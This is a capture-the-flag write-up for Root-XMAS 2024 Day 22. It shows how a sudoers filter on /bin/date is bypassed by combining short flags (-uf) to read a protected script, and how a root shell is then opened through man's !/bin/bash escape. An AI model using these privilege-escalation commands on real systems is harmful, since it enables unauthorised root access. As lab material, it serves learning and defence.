---
title: Root-XMAS 2024 Day 22 - The date is near
feed: hide
permalink: /RootXMAS_2024_22
date: 22-12-2024
summary: hear my arguments
---


### summary

bash shenanigans allows us to bypass a sudoers command filter.
### recon

We have access to a vm, so first thing we do is check if we can run some commands as a privileged user: 

```bash
sudo -l

User sshuser may run the following commands on the-date-is-near:
    (ALL) NOPASSWD: /bin/date *, !/bin/date *-f*, !/bin/date *--file*
    (ALL) NOPASSWD: /usr/bin/dev.sh
```

nice, we can run two commands! alas `dev.sh` does not appear to do anything when we run it, and we can't read it's content...
Let's focus on the binary hinted by the challenge, `date`. the [gtfobins date page](https://gtfobins.github.io/gtfobins/date/) shows us that we can get an arbitrary file read with the `-f/--file` argument.

Alas, these two options are specifically prevented by the sudoers configuration... 

### solution

Sometimes when you don't know about a subject, bruteforce can lead you on the right track:
I wanted to try tricking the bash command parsing by putting special characters in the middle of the `-f` option , so I did some bruteforce, trying all ascii characters:  

```bash
for i in {1..128}; do sudo /bin/date -$(printf "\\$(printf %03o "$i")")f /usr/bin/dev.sh; echo $i; done
```

And strangely, it worked with some characters, like 'u'.
Indeed in bash, you can call multiple shorthand arguments at the same time with a single '-' just like this: 

```bash
sudo /bin/date -uf /usr/bin/dev.sh
	/bin/date: invalid date '#!/bin/bash'
	Tue Dec 24 00:00:00 UTC 2024
	/bin/date: invalid date '# Check if the --debugmyscript argument is present'
	/bin/date: invalid date 'if [[ "$1" != "--debugmyscript" ]]; then'
	/bin/date: invalid date '    exit 0  # Exit silently if the --debugmyscript argument is not provided'
	...
```

Yay! now we know that `dev.sh`  took a secret `debugmyscript` argument to run!

```bash
sudo /usr/bin/dev.sh --debugmyscript
	Usage: /usr/bin/dev.sh [options]
	
	Options:
	  -l            List all running processes.
	  -d            Show available disk space.
	  -m            Show the manual for the printf command.
	  -h            Show this help message.

```

Now as the [gtfobins 'man' command page](https://gtfobins.github.io/gtfobins/man/) shows, we can start a root shell from then `man` command executed.

```bash
sudo /usr/bin/dev.sh --debugmyscript -m
!!/bin/bash

	ls /root
		flag-1a0a6...1.txt
	cat /root/*.txt
		RM{S4NTA_IS_N0T_4DMIN_SYS}
```


| Previous day | [[Day 18 - Santa's sweet words]] |
| ------------ | -------------------------------- |
| Next day     | [[Day 24 - Root-Xmas Quiz]]      |